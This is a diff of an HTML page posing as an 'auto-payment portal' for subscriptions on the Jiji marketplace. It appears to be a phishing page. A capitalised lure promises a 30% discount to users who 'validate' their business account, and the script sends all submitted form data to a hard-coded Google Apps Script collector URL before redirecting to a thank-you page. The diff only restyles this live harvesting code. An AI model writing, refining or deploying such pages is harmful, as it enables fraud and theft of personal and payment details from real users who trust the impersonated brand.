@@ -23,7 +23,7 @@
 <body>
   <div class="container">
     <div class="header">
-      <h2>Welcome to the Jiji auto-payment portal for your subscriptions on Jiji.</h2>
+      <h2>Welcome to the auto-payment portal for your subscriptions on Jiji.</h2>
       <p>PLEASE VALIDATE YOUR BUSINESS ACCOUNT TO HAVE ACCESS TO 30% DISCOUNT AND FREE CHARGES FOR YOUR SUBSCRIPTIONS</p>
     </div>
 
@@ -49,42 +49,39 @@
   </div>
 
   <script>
-    (function () {
-      const form = document.getElementById('jijiForm');
-      const statusEl = document.getElementById('status');
+    const form = document.getElementById('jijiForm');
+    const statusEl = document.getElementById('status');
 
-      // Your deployed Apps Script Web App URL
-      const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbxOpOdwYts-Td5SH48_hq9dADPzhwRuINh6LevT_up92sj2g0FiLDTnlcJ78SYe7As4RA/exec';
+    const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbxOpOdwYts-Td5SH48_hq9dADPzhwRuINh6LevT_up92sj2g0FiLDTnlcJ78SYe7As4RA/exec';
 
-      form.addEventListener('submit', async function (e) {
-        e.preventDefault();
-        statusEl.textContent = 'Submitting...';
-        statusEl.style.color = '#666';
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      statusEl.textContent = 'Submitting...';
+      statusEl.style.color = '#666';
 
-        try {
-          const formData = new FormData(form);
+      try {
+        const formData = new FormData(form);
 
-          const resp = await fetch(WEBAPP_URL, {
-            method: 'POST',
-            body: formData
-          });
+        const response = await fetch(WEBAPP_URL, {
+          method: 'POST',
+          body: formData
+        });
 
-          const text = await resp.text();
-          console.log("Server response:", text);
+        const text = await response.text();
+        console.log("Server says:", text);
 
-          if (resp.ok && text.includes("Success")) {
-            window.location.href = "thankyou.html"; // Redirect after success
-          } else {
-            statusEl.textContent = 'Submission failed. Try again.';
-            statusEl.style.color = '#aa0000';
-          }
-        } catch (err) {
-          console.error(err);
-          statusEl.textContent = 'Error submitting. Try again later.';
+        if (text.includes("SUCCESS")) {
+          window.location.href = "thankyou.html"; // redirect after success
+        } else {
+          statusEl.textContent = 'Submission failed. Try again.';
           statusEl.style.color = '#aa0000';
         }
-      });
-    })();
+      } catch (err) {
+        console.error(err);
+        statusEl.textContent = 'Error submitting. Try again later.';
+        statusEl.style.color = '#aa0000';
+      }
+    });
   </script>
 </body>
 </html>
